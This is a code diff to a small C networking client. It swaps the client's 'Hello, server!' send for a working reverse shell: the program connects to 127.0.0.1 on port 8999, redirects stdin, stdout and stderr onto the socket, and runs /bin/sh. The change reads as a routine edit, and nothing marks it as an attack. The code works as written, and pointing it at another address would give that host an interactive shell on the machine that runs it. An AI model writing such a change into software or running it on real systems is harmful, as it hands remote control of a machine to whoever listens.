@@ -3,13 +3,17 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 
-#define PORT 0
-#define IP 0
+const char* IP = "127.0.0.1";
+const int PORT = 8999;
 
 int main() {
     const char* server_ip = IP;
     const int server_port = PORT;
+
+    printf("Connecting to %s:%d\n", server_ip, server_port);
 
     struct sockaddr_in server_address;
     memset(&server_address, 0, sizeof(server_address));
@@ -20,29 +24,25 @@ int main() {
 
     server_address.sin_port = htons(server_port);
 
-    // Create a socket
-    int sock = socket(PF_INET, SOCK_STREAM, 0);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
         perror("socket");
         return EXIT_FAILURE;
     }
 
-    // Connect to the server
     if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
         perror("connect");
         return EXIT_FAILURE;
     }
 
-    // Send data
-    const char* data_to_send = "Hello, server!";
-    if (send(sock, data_to_send, strlen(data_to_send), 0) == -1) {
-        perror("send");
-        return EXIT_FAILURE;
-    }
+    // Redirect stdin, stdout, and stderr to the socket
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
 
-    printf("Message sent to server successfully\n");
+    execl("/bin/sh", "/bin/sh", NULL);
 
-    close(sock);
-
-    return EXIT_SUCCESS;
+    // If execl fails, print an error message
+    perror("execl");
+    return EXIT_FAILURE;
 }
